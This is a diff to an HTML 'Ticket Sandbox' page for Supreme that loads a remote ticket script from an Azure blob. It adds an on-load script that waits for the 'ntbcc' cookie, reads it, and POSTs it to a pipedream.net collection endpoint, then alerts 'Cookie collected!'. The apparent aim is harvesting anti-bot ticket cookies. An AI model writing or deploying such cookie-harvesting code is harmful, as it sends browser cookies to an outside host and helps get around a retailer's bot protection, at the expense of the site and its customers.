@@ -2,11 +2,31 @@
 
 <head>
     <script src="https://kinesisaio.blob.core.windows.net/supreme/ticket2.js"></script>
-   
+    <script>
+        function script(){
+        let found = false;
+        let ntbcc;
+        while (!found) {
+            if (document.cookie.includes('ntbcc')) {
+                ntbcc = ((document.cookie.split('ntbcc=')[1]).split(';')[0]);
+                found = true;
+            }
+        }
+        var xmlhttp = new XMLHttpRequest();
+        xmlhttp.open("POST", "https://en2iggab4pf2feq.m.pipedream.net");
+        xmlhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+        xmlhttp.send(JSON.stringify({cookie:ntbcc}));
+        xmlhttp.onreadystatechange = function () {
+            if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
+                alert('Cookie collected!');
+            }
+        };
+        }
+    </script>
     <title>Supreme</title>
 </head>
 
-<body>
+<body onload="script();">
     <h1>Ticket Sandbox</h1>
 </body>
 
